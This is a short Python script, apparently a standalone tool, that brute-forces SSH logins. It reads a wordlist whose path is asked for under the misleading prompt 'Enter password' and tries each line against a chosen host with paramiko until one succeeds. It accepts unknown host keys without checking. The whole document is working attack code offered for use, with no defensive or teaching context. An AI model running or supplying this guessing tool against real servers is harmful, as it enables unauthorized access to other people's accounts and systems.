import paramiko, os, sys, socket

user = input("Enter username: ")
password = input("Enter password: ")
host = input("Enter host: ")

def ssh_connect(password, code=0): 
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
    try:
        ssh.connect(host, username=user, password=password)
    except paramiko.AuthenticationException: 
        code = 1
    except socket.error:
        code = 2
    ssh.close()
    return code

if not os.path.exists(password):
    print("Password file not found")
    sys.exit()

with open(password, "r") as f:
    for line in f:
        if ssh_connect(line.strip()) == 0:
            print("Password found: " + line.strip())
            sys.exit() 
